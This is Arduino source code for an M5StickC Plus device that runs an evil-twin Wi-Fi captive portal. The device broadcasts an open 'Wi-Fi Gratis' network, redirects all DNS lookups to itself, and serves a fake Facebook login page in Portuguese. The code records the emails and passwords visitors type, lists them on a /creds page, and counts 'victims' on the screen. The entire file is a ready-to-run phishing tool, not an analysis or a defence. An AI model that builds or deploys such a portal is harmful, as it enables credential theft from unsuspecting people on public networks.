#include <M5StickCPlus.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
 
 
// Based on https://community.dfrobot.com/makelog-313463.html
// Modified font and text placement for StickC-Plus, further improvements added
// Code BY: https://github.com/n0xa/
// Moded BY: https://github.com/Kuush01
// Moded BY: https://github.com/raphntc

 
// User configuration
#define SSID_NAME "Wi-Fi Gratis"
#define SUBTITLE "E-CORP service."
#define TITLE "Sign in:"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validando Acesso..."
#define POST_BODY "Sua conta esta sendo validada. Aguarde ate 5 minutos pela conexao do dispositivo.</br>Obrigado."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
 
int capcount=0;
int previous=-1; // stupid hack but wtfe
int BUILTIN_LED = 10;
 
// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway
 
String Credentials = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer; WebServer webServer(80);
 
String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;"); a.replace(">", "&gt;");
  a.substring(0, 200); return a;
}
 
String footer() {
  return
    "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}
 
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}
 
String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}
 
String index() {
  String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    "<meta charset=\"UTF-8\">"
    "<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">"
    "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
    "<style>"
    "@charset \"utf-8\";"
    "* {box-sizing: border-box;text-decoration: none;}"
    "body {display: flex;flex-direction: row;justify-content: center;align-items: center;margin-top: 40px;font-family: Helvetica, sans-serif;background: #F3F2F2;}"
    "div#corpo h1 {text-align: center;color: #4169e1;font-size: 50px;}"
    "div#login {border-radius: 6px;width: 350px;box-shadow: 0 2px 4px rgba(0 ,0 ,0 ,0.3), 0 8px 16px rgba(0 ,0 ,0 ,0.3);}"
    "div#login form {width: 100px 100px;padding: 16px;background-color: white;border-radius: 8px;}"
    "div#login a {padding-left: 80px;margin-top: 16px;display: block;}"
    "div#login p {text-align: center;font-size: 16px;margin-top: 5px;}"
    "div#login input {width: 100%;margin-bottom: 10px;padding: 16px;border-radius: 6px;border: 1px solid #c3c5c9;}"
    "div#login input[placeholder] {font-size: 16px;opacity: 50%;}"
    "div#login button {background-color: #4169e1;border-radius: 8px;border: 1px solid white;width: 100%;padding: 15px;color: white;font-family: Helvetica, sans-serif;font-size: 16px;font-weight: bold;cursor: pointer;}"
    "</style>"
    "<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\">"
    "<title>Facebook</title>"
    "</head>"
    "<body>"
    "<div id=\"corpo\">"
    "<h1>facebook</h1>"
    "<div id=\"login\">"
    "<form name=\"login-form\" method=\"POST\" action=\"/post\">"
    "<p>Entrar no Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email ou telefone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Senha\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Entrar</button>"
    "<a href=\"#\">Esqueceu a senha?</a>"
    "</form>"
    "</div>"
    "</div>"
    "</body>"
    "</html>";
 
  return htmlContent;
}
 
String posted() {
  String email = input("email");
  String password = input("password");
  Credentials = "<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  return header("Validando...") + "Sua conta está sendo validada. Aguarde até 5 minutos pela conexão do dispositivo.</br>Obrigado." + footer();
}
 
String clear() {
  String email = "<p></p>";
  String password = "<p></p>";
  Credentials = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}
 
void BLINK() { // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}
 
void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setSwapBytes(true);
  M5.Lcd.setTextSize(2);
 
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
 
  webServer.on("/post", []() {
    capcount=capcount+1;
    webServer.send(HTTP_CODE, "text/html", posted());
    M5.Beep.tone(4000);
    M5.Lcd.print("Victim Login");
    delay(50);
    M5.Beep.mute();
    BLINK();
    M5.Lcd.fillScreen(BLACK);
  });
 
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
 
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}
 
void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    if(capcount > previous){
      previous = capcount;
 
      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setSwapBytes(true);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(TFT_PURPLE, TFT_BLACK);
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.print("PORTAL EVIL HUEBR");
      M5.Lcd.setTextColor(TFT_BLUE, TFT_BLACK);
      M5.Lcd.setCursor(0, 35);
      M5.Lcd.print("WiFi IP: ");
      M5.Lcd.println(APIP);
      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
      M5.Lcd.printf("Victim Count: %d\n", capcount);
    }
  }
  dnsServer.processNextRequest(); webServer.handleClient();
}